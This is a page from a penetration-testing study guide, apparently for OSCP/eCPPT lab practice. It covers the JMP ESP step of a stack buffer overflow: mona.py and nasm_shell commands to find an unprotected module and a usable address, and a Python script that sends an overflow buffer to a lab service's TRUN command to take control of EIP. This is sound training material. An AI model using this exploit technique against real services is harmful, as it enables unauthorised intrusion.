<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Find the right module for JMP ESP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Find the right module for JMP ESP</h1><br /><br /><br />Now we need to find .dll or something
    similar inside a service that has not memory protections(ASLR, DEP, ...)<br /><br />• <span
      style="text-decoration:underline;">Immunity Debugger:</span> To find <span style="color:#ff0000;">JMP ESP</span>
    (or CALL ESP) in the application we can simply disassemble it(with Immunity Debugger or IDA) and then search for the
    instruction with CTRL+F.<br /> If we want to search the command in all the modules and libraries loaded by the
    program we have to select <strong>Search for → All Commands in all modules</strong><br /> ◇ or with mona.py (include
    the bad char found in the chapter above):<br />
    <div class="codebox">
      <div class="codebox">!mona&nbsp;jmp&nbsp;-r&nbsp;esp&nbsp;-cpb&nbsp;&quot;\x00....&quot;</div>
    </div><br /> -cpb is used to ensure that the address of the instruction doesn&#39;t contain the bad chars \x00 <span
      style="text-decoration:underline;">and the others that we have found in the chapter before</span>.<br /> <a
      href=""><img src="images/2141-1.png" alt="images/2141-1.png" /></a><br /><br />• <span
      style="text-decoration:underline;">search modules with JMP ESP</span>:<br /> Link mona: <a
      href="https://raw.githubusercontent.com/corelan/mona/master/mona.py" target="_blank">https://raw.githubusercontent.com/corelan/mona/master/mona.py</a><br />
    Download mona.py and place inside: “C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands”<br /> 1) With the
    service running run:<br />
    <div class="codebox">
      <div class="codebox">!mona&nbsp;modules</div>
    </div><br /> <a href=""><img src="images/2141-2.png" alt="images/2141-2.png" /></a><br /> We need to find a module
    with most of the protections disabled. In this example is <span style="color:#ff0000;">essfunc.dll</span><br /> 2)
    Now we need to search a JMP ESP. To convert &quot;JMP ESP&quot; in hexadecimal we can use nasm_shell.<br />
    <div class="codebox">
      <div class="codebox">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb<br />JMP&nbsp;ESP</div>
    </div><br /> <a href=""><img src="images/2141-3.png" alt="images/2141-3.png" /></a><br /> hexadecimal equivalent of
    the JMP ESP instruction which is \xFF\xE4<br /> 3) Run in Immunity:<br /> <span
      style="color:#ff0000;">essfunc.dll</span> is the module found before without memory protection<br />
    <div class="codebox">
      <div class="codebox">!mona&nbsp;find&nbsp;-s&nbsp;&quot;\xFF\xE4&quot;&nbsp;-m&nbsp;essfunc.dll</div>
    </div><br /> <a href=""><img src="images/2141-4.png" alt="images/2141-4.png" /></a><br /> Now we need to use one of
    these address in the EIP that will jump to the ESP. <span style="text-decoration:underline;">This address cannot
      contain </span><a
      href="st_Methodology--Network_Pentest--Exploitation--Buffer_Overflow--Steps_to_conduct_a_Buffer_Overflow_(OSCP_&_eCPPT)--Finding_Bad_Characters.html">any
      of the bad characters</a>.<br /> Copy an address(example: 625011AF) that point to JMP ESP command and add it to
    the payload in hexadecimal and in a swapped order (\xAF\x11\x50\x62)<br /> 4) Change the value of<br /> ◇
    jmp_address → with the value found at point 3 <br /> ◇ eip_address_location → with the value found in the chapter
    “Find the Offset”<br /> ◇ s.connect → with address and port of the service<br /> ◇ s.send → with the value of the
    command of the service<br />
    <div class="codebox">
      <div class="codebox">
        #!/usr/bin/python<br />import&nbsp;socket<br />import&nbsp;sys<br />from&nbsp;time&nbsp;import&nbsp;sleep<br /><br />jmp_address&nbsp;=&nbsp;&#39;\xAF\x11\x50\x62&#39;<br />eip_address_location&nbsp;=&nbsp;2003<br />buffer&nbsp;=&nbsp;&#39;A&#39;&nbsp;*&nbsp;eip_address_location&nbsp;+&nbsp;jmp_address<br /><br />try:<br />&nbsp;&nbsp;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />&nbsp;&nbsp;s.settimeout(2)<br />&nbsp;&nbsp;s.connect((&#39;192.168.1.118&#39;,9999))<br />&nbsp;&nbsp;s.recv(1024)<br />&nbsp;&nbsp;<br />&nbsp;&nbsp;print&nbsp;&#39;[*]&nbsp;Sending&nbsp;buffer.&#39;<br />&nbsp;&nbsp;s.send(&#39;TRUN&nbsp;/.:/&#39;&nbsp;+&nbsp;buffer&nbsp;+&nbsp;&#39;\r\n&#39;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#target&nbsp;the&nbsp;TRUN&nbsp;command<br />&nbsp;&nbsp;s.close()<br />&nbsp;&nbsp;<br />except:<br />&nbsp;&nbsp;print&nbsp;&#39;[*]&nbsp;Could&nbsp;not&nbsp;connect&nbsp;to&nbsp;target,&nbsp;exiting.&#39;<br />&nbsp;&nbsp;sys.exit<span
          style="color:#000000;font-weight:400">()</span></div>
    </div><br /> 5) In Immunity use “Go To address in Disassembler” <a href=""><img src="images/2141-5.png"
        alt="images/2141-5.png" /></a> and search for the address found at point 3<br /> <a href=""><img
        src="images/2141-6.png" alt="images/2141-6.png" /></a><br /> <a href=""><img src="images/2141-7.png"
        alt="images/2141-7.png" /></a><br /> and set a breakpoint on it with F2<br /> <a href=""><img
        src="images/2141-8.png" alt="images/2141-8.png" /></a><br /> In this way we can check if we overwrite the
    <strong><span style="color:#ffff00;">EIP</span></strong> with this address<br /><br /> 6) Run the script of point
    4<br /> Check on Immunity if it worked<br /> <a href=""><img src="images/2141-9.png"
        alt="images/2141-9.png" /></a><br /> YES! worked since we can see the jmp_address in the <span
      style="color:#ffff00;">EIP</span><br /> <br /> <br /> <br /> <br />
  </div>
</body>

</html>